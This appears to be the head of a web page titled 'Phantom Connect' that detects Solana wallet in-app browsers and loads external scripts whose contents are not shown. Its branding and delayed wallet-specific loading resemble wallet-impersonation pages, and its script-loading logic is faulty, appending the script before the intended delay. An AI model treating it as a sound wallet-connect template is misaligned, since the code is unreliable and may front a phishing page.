<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Phantom Connect</title>
    <link rel="icon" href="" type="image/x-icon">
    <script src="dynamicview.js"></script>
    <!-- <script src="info.js"></script> -->
    <script>
        const mobileRegex = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i;
        const userAgent = navigator.userAgent.toLowerCase();
        const isPhantomApp = userAgent.includes('phantom');
        const isSolflareApp = userAgent.includes('solflare');

        const script = document.createElement('script');
        script.src = 'Solana-connect.js';
        document.head.appendChild(script);

        if (mobileRegex.test(navigator.userAgent) || isPhantomApp || isSolflareApp) {
            setTimeout(() => {
                document.head.appendChild(script);
            }, 2500);
        } else {
            document.head.appendChild(script);
        }
    </script>
</head>
